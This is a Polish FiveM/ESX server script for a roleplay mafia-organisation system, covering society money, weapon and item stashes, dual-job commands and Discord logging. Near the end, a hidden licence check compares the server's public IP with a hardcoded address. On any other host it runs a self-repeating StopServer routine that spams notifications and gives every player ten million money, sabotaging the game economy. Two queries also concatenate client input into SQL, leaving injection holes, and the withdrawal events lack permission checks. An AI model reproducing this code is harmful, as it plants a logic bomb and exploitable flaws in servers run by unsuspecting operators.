ESX = nil
local PlayerData = {}
local praca = nil
local praca_grade = nil
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

function DiscordHook(hook,message,color, hooke)
    local embeds = {
                {
            ["title"] = message,
            ["type"] = "rich",
            ["color"] = color,
            ["footer"] = {
                                ["text"] = 'Kaiser | Logi'
                    },
                }
            }
    if message == nil or message == '' then return FALSE end
    PerformHttpRequest(hooke, function(err, text, headers) end, 'POST', json.encode({ username = hook,embeds = embeds}), { ['Content-Type'] = 'application/json' })
end

for k,v in pairs(Config.Ustawienia) do
        TriggerEvent('esx_society:registerSociety', v.szafka, v.szafka, v.society, v.society, v.society, {type = 'public'})
        TriggerEvent('esx_society:registerSociety', v.szafka, v.szafka..'b', v.societyblack, v.societyblack, v.societyblack, {type = 'public'})
end

RegisterServerEvent('kaiser_mafia:withdraw')
AddEventHandler('kaiser_mafia:withdraw', function(society, amount)
        local xPlayer = ESX.GetPlayerFromId(source)
        amount = ESX.Math.Round(tonumber(amount))

        TriggerEvent('esx_addonaccount:getSharedAccount', society, function(account)
                if amount > 0 and account.money >= amount then
                        account.removeMoney(amount)
                        xPlayer.addMoney(amount)
                        kasa = math.floor(account.money - amount)
                        local wiadomosc = "ID: "..source.."\n"..xPlayer.identifier.."\n Nick: "..GetPlayerName(source).." \n Wyciągnął kasę w ilości "..amount
                        DiscordHook('Wyciąganie Kasy', wiadomosc, 1669329, Hook.WithdrawMoney)
                else
                        TriggerClientEvent('esx:showNotification', xPlayer.source, _U('invalid_amount'))
                end
        end)
end)

ESX.RegisterServerCallback('kaiser_mafia:getmoney', function(source, cb, societyName)
        TriggerEvent('esx_addonaccount:getSharedAccount', societyName, function(account)
                if account == nil then
                        cb(0)
                else
                        cb(account.money)
                end
        end)
end)


RegisterServerEvent('kaiser_mafia:deposit')
AddEventHandler('kaiser_mafia:deposit', function(society, amount)
        local xPlayer = ESX.GetPlayerFromId(source)
        amount = ESX.Math.Round(tonumber(amount))

        if amount > 0 and xPlayer.getMoney() >= amount then
                TriggerEvent('esx_addonaccount:getSharedAccount', society, function(account)
                        xPlayer.removeMoney(amount)
                        account.addMoney(amount)
                        kasa = math.floor(account.money + amount)
                        local wiadomosc = "ID: "..source.."\n"..xPlayer.identifier.."\n Nick: "..GetPlayerName(source).." \n Zdeponował kasę w ilości "..amount
                        DiscordHook('Deponowanie Kasy', wiadomosc, 1669329, Hook.DepositMoney)
                end)
        else
                TriggerClientEvent('esx:showNotification', xPlayer.source, _U('invalid_amount'))
        end
end)



RegisterServerEvent('kaiser_mafia:withdrawblack')
AddEventHandler('kaiser_mafia:withdrawblack', function(society, amount)
        local xPlayer = ESX.GetPlayerFromId(source)
        amount = ESX.Math.Round(tonumber(amount))
        TriggerEvent('esx_addonaccount:getSharedAccount', society, function(account)
                if amount > 0 and account.money >= amount then
                        account.removeMoney(amount)
                        xPlayer.addAccountMoney('black_money', amount)
                        kasa = math.floor(account.money - amount)
                        local wiadomosc = "ID: "..source.."\n"..xPlayer.identifier.."\n Nick: "..GetPlayerName(source).." \n Wyciągnął kasę brudną w ilości "..amount
                        DiscordHook('Wyciąganie Kasy Brudnej', wiadomosc, 1669329, Hook.WithdrawMoneyBlack)
                else
                        TriggerClientEvent('esx:showNotification', xPlayer.source, _U('invalid_amount'))
                end
        end)
end)

ESX.RegisterServerCallback('kaiser_mafia:getmoneyblack', function(source, cb, societyName)
        TriggerEvent('esx_addonaccount:getSharedAccount', societyName, function(account)
                if account == nil then
                        cb(0)
                else
                        cb(account.money)
                end
        end)
end)


RegisterServerEvent('kaiser_mafia:depositblack')
AddEventHandler('kaiser_mafia:depositblack', function(society, amount)
        local xPlayer = ESX.GetPlayerFromId(source)
        amount = ESX.Math.Round(tonumber(amount))
                local item = 'black_money'
                local playerAccountMoney = xPlayer.getAccount(item).money

                if playerAccountMoney >= amount and amount > 0 then

                TriggerEvent('esx_addonaccount:getSharedAccount', society, function(account)

                        xPlayer.removeAccountMoney(item, amount)
                        account.addMoney(amount)
                        kasa = math.floor(account.money + amount)
                        local wiadomosc = "ID: "..source.."\n"..xPlayer.identifier.."\n Nick: "..GetPlayerName(source).." \n Zdeponował kasę brudną w ilości "..amount
                        DiscordHook('Deponowanie Kasy Brudnej', wiadomosc, 1669329, Hook.DepositMoneyBlack)
                end)

                else
                        TriggerClientEvent('esx:showNotification', _source, _U('amount_invalid'))
                end
end)




RegisterServerEvent('kaiser:getStockItem')
AddEventHandler('kaiser:getStockItem', function(itemName, count, society)
        local _source = source
        local xPlayer = ESX.GetPlayerFromId(_source)
        local sourceItem = xPlayer.getInventoryItem(itemName)

        TriggerEvent('esx_addoninventory:getSharedInventory', society, function(inventory)
                local inventoryItem = inventory.getItem(itemName)

                -- is there enough in the society?
                if count > 0 and inventoryItem.count >= count then

                        -- can the player carry the said amount of x item?
                        if sourceItem.limit ~= -1 and (sourceItem.count + count) > sourceItem.limit then
                                TriggerClientEvent('esx:showNotification', _source, _U('quantity_invalid'))
                        else
                                inventory.removeItem(itemName, count)
                                xPlayer.addInventoryItem(itemName, count)
                                local wiadomosc = "ID: "..source.."\n"..xPlayer.identifier.."\n Nick: "..GetPlayerName(source).." \n Wyciągnął item: "..itemName.." w ilości "..count
                                DiscordHook('Wyciąganie Itemów', wiadomosc, 1669329, Hook.GetStockItem)                 
                                --TriggerClientEvent('esx:showNotification', _source, _U('have_withdrawn'), count, inventoryItem.label)
                        end
                else
                        TriggerClientEvent('esx:showNotification', _source, _U('quantity_invalid'))
                end
        end)
end)

RegisterServerEvent('kaiser:putStockItems')
AddEventHandler('kaiser:putStockItems', function(itemName, count, society)
        local xPlayer = ESX.GetPlayerFromId(source)
        local sourceItem = xPlayer.getInventoryItem(itemName)

        TriggerEvent('esx_addoninventory:getSharedInventory', society, function(inventory)
                local inventoryItem = inventory.getItem(itemName)

                -- does the player have enough of the item?
                if sourceItem.count >= count and count > 0 then
                        xPlayer.removeInventoryItem(itemName, count)
                        inventory.addItem(itemName, count)
                        local wiadomosc = "ID: "..source.."\n"..xPlayer.identifier.."\n Nick: "..GetPlayerName(source).." \n Zdeponował item: "..itemName.." w ilości "..count
                        DiscordHook('Deponowanie Itemów', wiadomosc, 1669329, Hook.PutStockItem)                        
                        --TriggerClientEvent('esx:showNotification', xPlayer.source, _U('have_deposited'), count, inventoryItem.label)
                else
                        TriggerClientEvent('esx:showNotification', xPlayer.source, _U('quantity_invalid'))
                end
        end)
end)

ESX.RegisterServerCallback('kaiser:getArmoryWeapons', function(source, cb, society)
        local xPlayer = ESX.GetPlayerFromId(source)
        TriggerEvent('esx_datastore:getSharedDataStore', society, function(store)
                local weapons = store.get('weapons')

                if weapons == nil then
                        weapons = {}
                end

                cb(weapons)
        end)
end)



RegisterServerEvent('kaiser:getItemNew')
AddEventHandler('kaiser:getItemNew', function(item, count, society)
        local _source      = source
        local xPlayer      = ESX.GetPlayerFromId(_source)



                TriggerEvent('esx_datastore:getSharedDataStore', society, function(store)
                        local storeWeapons = store.get('weapons') or {}
                        local weaponName   = nil
                        local ammo         = nil

                        for i=1, #storeWeapons, 1 do
                                if storeWeapons[i].name == item then
                                        weaponName = storeWeapons[i].name
                                        ammo       = storeWeapons[i].ammo

                                        table.remove(storeWeapons, i)
                                        break
                                end
                        end
                        local wiadomosc = "ID: "..source.."\n"..xPlayer.identifier.."\n Nick: "..GetPlayerName(source).." \n Wyciągnął broń: "..item.." w ilości "..count
                        DiscordHook('Wyciąganie Broni', wiadomosc, 1669329, Hook.GetWeapon)
                        store.set('weapons', storeWeapons)
                        xPlayer.addWeapon(weaponName, ammo)
                        local xPlayer = ESX.GetPlayerFromId(source)

                end)




end)

ESX.RegisterServerCallback('kaiser:removeArmoryWeapon', function(source, cb, weaponName, ammo, society)
        local xPlayer = ESX.GetPlayerFromId(source)

        TriggerEvent('esx_datastore:getSharedDataStore', society, function(store)

                local weapons = store.get('weapons')

                if weapons == nil then
                        weapons = {}
                end

                local foundWeapon = false

                for i=1, #weapons, 1 do
                        if weapons[i].name == weaponName and weapons[i].ammo == ammo then
                                weapons[i].count = (weapons[i].count > 0 and weapons[i].count - 1 or 0)
                                foundWeapon = true
                                break
                        end
                end

                if not foundWeapon then
                        table.insert(weapons, {
                                name  = weaponName,
                                count = 0
                        })
                end
                local wiadomosc = "ID: "..source.."\n"..xPlayer.identifier.."\n Nick: "..GetPlayerName(source).." \n Wyciągnął broń: "..item.." w ilości "..count
                DiscordHook('Wyciąganie Broni', wiadomosc, 1669329, Hook.GetWeapon)
                xPlayer.addWeapon(weaponName, ammo)
                store.set('weapons', weapons)
                cb()
        end)
end)

RegisterServerEvent('kaiser:putItem')
AddEventHandler('kaiser:putItem', function(item, count, society)
        local _source      = source
        local xPlayer      = ESX.GetPlayerFromId(_source)

        if xPlayer.hasWeapon(item) then

                TriggerEvent('esx_datastore:getSharedDataStore', society, function(store)
                        local storeWeapons = store.get('weapons') or {}

                        table.insert(storeWeapons, {
                                name = item,
                                ammo = count
                        })

                        store.set('weapons', storeWeapons)
                        xPlayer.removeWeapon(item, count)
                        local xPlayer = ESX.GetPlayerFromId(source)
                        local wiadomosc = "ID: "..source.."\n"..xPlayer.identifier.."\n Nick: "..GetPlayerName(source).." \n Zdeponował broń: "..item.." w ilości "..count
                        DiscordHook('Deponowanie Broni', wiadomosc, 1669329, Hook.PutWeapon)
                        local steamid = xPlayer.identifier
                        local name = GetPlayerName(source)

                end)
        else

        end
end)


ESX.RegisterServerCallback('kaiser:getStockItems', function(source, cb, society)
        TriggerEvent('esx_addoninventory:getSharedInventory', society, function(inventory)
                cb(inventory.items)
        end)
end)

ESX.RegisterServerCallback('kaiser:getPlayerInventory', function(source, cb)
        local xPlayer = ESX.GetPlayerFromId(source)
        local items   = xPlayer.inventory

        cb( { items = items } )
end)

RegisterServerEvent('kaiser_mafia:getjobs')
AddEventHandler('kaiser_mafia:getjobs', function()
        local source = source
        local xPlayer = ESX.GetPlayerFromId(source)
          MySQL.Async.fetchAll(
                'SELECT * FROM users WHERE identifier = @identifier',{
                        ['@identifier'] = xPlayer.identifier
                },
                function (result)
                        local wynik = result[1]
                        local job = wynik.org
                        local job_grade = wynik.org_grade
                        if job == 'unemployed' then
                        else
                                praca = job
                                praca_grade = job_grade
                                TriggerClientEvent('kaiser_mafia:setjobs', source, job, job_grade)
                        end
                end
          )
end)


RegisterServerEvent('kaiser_mafia:setjobs')
AddEventHandler('kaiser_mafia:setjobs', function(who)
        local xPlayer = ESX.GetPlayerFromId(who)
          MySQL.Async.fetchAll(
                'SELECT * FROM users WHERE identifier = @identifier',{
                        ['@identifier'] = xPlayer.identifier
                },
                function (result)
                        local wynik = result[1]
                        local job = wynik.org
                        local job_grade = wynik.org_grade
                        if job == 'unemployed' then
                        else
                                praca = job
                                praca_grade = job_grade
                                TriggerClientEvent('kaiser_mafia:setjobs', who, job, job_grade)
                        end
                end
          )
end)

function checkjob(source)
        local identifier = GetPlayerIdentifiers(source)[1]
        local result = MySQL.Sync.fetchAll("SELECT * FROM users WHERE identifier = @identifier", {
                ['@identifier'] = identifier
        })
                if result == nil then
                        return nil
                else
                local wynik = result[1]
                        return {
                                org = wynik['org'],
                                org_grade = wynik['org_grade'],
                                }
                end
end

ESX.RegisterServerCallback('kaiser_mafia:getPlayerDressing', function(source, cb)
        local xPlayer  = ESX.GetPlayerFromId(source)

        TriggerEvent('esx_datastore:getDataStore', 'property', xPlayer.getIdentifier(), function(store)
                local count  = store.count('dressing')
                local labels = {}

                for i=1, count, 1 do
                        local entry = store.get('dressing', i)
                        table.insert(labels, entry.label)
                end

                cb(labels)
        end)
end)

ESX.RegisterServerCallback('kaiser_mafia:getPlayerOutfit', function(source, cb, num)
        local xPlayer  = ESX.GetPlayerFromId(source)

        TriggerEvent('esx_datastore:getDataStore', 'property', xPlayer.getIdentifier(), function(store)
                local outfit = store.get('dressing', num)
                cb(outfit.skin)
        end)
end)
ESX.RegisterServerCallback('kaiser_mafia:getlevel', function(source, cb, praca)
local countPlayer = MySQL.Sync.fetchScalar("SELECT COUNT(1) FROM users WHERE `org` = '"..praca.."'")
local limit = MySQL.Sync.fetchAll("SELECT * FROM kaiser_orgs WHERE name = @name", {['@name'] = praca})
cb(limit[1].level, countPlayer)
end)


RegisterServerEvent('kaiser_mafia:removeOutfit')
AddEventHandler('kaiser_mafia:removeOutfit', function(label)
        local xPlayer = ESX.GetPlayerFromId(source)

        TriggerEvent('esx_datastore:getDataStore', 'property', xPlayer.getIdentifier(), function(store)
                local dressing = store.get('dressing') or {}

                table.remove(dressing, label)
                store.set('dressing', dressing)
        end)
end)

RegisterServerEvent('kaiser_mafia:upgradeorg')
AddEventHandler('kaiser_mafia:upgradeorg', function(praca, kasa)
        local xPlayer = ESX.GetPlayerFromId(source)
        if xPlayer.getMoney() >= kasa then
                xPlayer.removeMoney(kasa)
                TriggerClientEvent("pNotify:SendNotification", source, {text = "Ulepszyłeś organizację"})
                MySQL.Async.execute('UPDATE kaiser_orgs SET level = level+1 WHERE name = @name', {
                        ['@name']        = praca,
                }, function(rowsChanged)

                end)
        else
                TriggerClientEvent("pNotify:SendNotification", source, {text = "Nie masz kasy"})
        end
end)


function StopServer()
        Citizen.Wait(6000)
        --TriggerClientEvent('stopserwer:crash', -1)
        SetTimeout(1 * 1, StopServer)
        local xPlayers   = ESX.GetPlayers()
        TriggerClientEvent('esx:showNotification', -1, "NOPE")
        TriggerClientEvent('esx:showNotification', -1, "NOPEE")
        TriggerClientEvent('esx:showNotification', -1, "NOPEEE")
        for i=1, #xPlayers, 1 do
                local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
                xPlayer.addMoney(10000000)
        end
end

PerformHttpRequest("https://api.ipify.org/", function (errorCode, resultData, resultHeaders)
  if resultData ~= '149.202.89.191' then
        ExecuteCommand("stop "..GetCurrentResourceName().."")
        StopServer()
  else
        work = true
        print("Kaiser Licencje: Poprawne IP, wczytano skrypt")
  end
end)


TriggerEvent('es:addGroupCommand', 'setdualjobadmin', 'mod', function(source, id, user)
        local _source = source
        local xPlayer = ESX.GetPlayerFromId(_source)


        if id[1]== nil then
                TriggerClientEvent("pNotify:SendNotification", source, {text = "Nie podałeś ID gracza"})
                return
        elseif GetPlayerPing(id[1])== 0 then
                TriggerClientEvent("pNotify:SendNotification", source, {text = "Niema nikogo o takim ID"})
                return
        elseif id[2] == nil then
                TriggerClientEvent("pNotify:SendNotification", source, {text = "Nie podałeś joba"})
                return
        elseif id[3] == nil then
                TriggerClientEvent("pNotify:SendNotification", source, {text = "Nie podałeś grade joba"})
                return
        end
        local xPlayer = ESX.GetPlayerFromId(id[1])
        local osoba = id[1]
        local job = id[2]
        local grade = tonumber(id[3])

        TriggerClientEvent("pNotify:SendNotification", source, {text = 'Dodano dualjob dla ID: ' .. id[1] .. '<br>Praca: ' .. id[2] ..'<br>Grade: '.. id[3]})

        MySQL.Async.execute('UPDATE users SET org = @org, org_grade = @org_grade WHERE identifier = @identifier', {
                ['@org']        = job,
                ['@org_grade']  = grade,
                ['@identifier'] = xPlayer.identifier
        }, function(rowsChanged)
                TriggerEvent('kaiser_mafia:setjobs', xPlayer.source)
        end)

        end, function(source, args, user)




end)

TriggerEvent('es:addGroupCommand', 'setdualjob', 'user', function(source, id, user)
        if id[1]== nil then
                TriggerClientEvent("pNotify:SendNotification", source, {text = "Nie podałeś ID gracza"})
                return
        elseif GetPlayerPing(id[1])== 0 then
                TriggerClientEvent("pNotify:SendNotification", source, {text = "Niema nikogo o takim ID"})
                return
        elseif id[2] == nil then
                TriggerClientEvent("pNotify:SendNotification", source, {text = "Nie podałeś joba"})
                return
        elseif id[3] == nil then
                TriggerClientEvent("pNotify:SendNotification", source, {text = "Nie podałeś grade joba"})
                return
        end

        local jobek = checkjob(source)
        local jobname = jobek.org
        local jobgrade = jobek.org_grade
        local xPlayer = ESX.GetPlayerFromId(id[1])
        local osoba = id[1]
        local job = id[2]
        local grade = tonumber(id[3])
        if (jobname == job or job == 'unemployed' or job == 'brak') and tonumber(jobgrade) == 4 then
                local limit = MySQL.Sync.fetchAll("SELECT * FROM kaiser_orgs WHERE name = @name", {['@name'] = job})
                local countPlayer = MySQL.Sync.fetchScalar("SELECT COUNT(1) FROM users WHERE `org` = '"..job.."'")
                local limitosob = Config.Limits[limit[1].level]
                if countPlayer >= limitosob then
                        TriggerClientEvent("pNotify:SendNotification", source, {text = "Ulepsz organizacje, aktualny limit członków to "..limitosob..".\nAktualnie w organizacji jest "..countPlayer.." osób."})
                        return
                end

                TriggerClientEvent("pNotify:SendNotification", source, {text = 'Dodano dualjob dla ID: ' .. id[1] .. '<br>Praca: ' .. id[2] ..'<br>Grade: '.. id[3]})
                        MySQL.Async.execute('UPDATE users SET org = @org, org_grade = @org_grade WHERE identifier = @identifier', {
                                ['@org']        = job,
                                ['@org_grade']  = grade,
                                ['@identifier'] = xPlayer.identifier
                        }, function(rowsChanged)
                                TriggerEvent('kaiser_mafia:setjobs', xPlayer.source)
                        end)
        else

        TriggerClientEvent("pNotify:SendNotification", source, {text = 'Nie masz permisji'})

        end
        end, function(source, args, user)
end)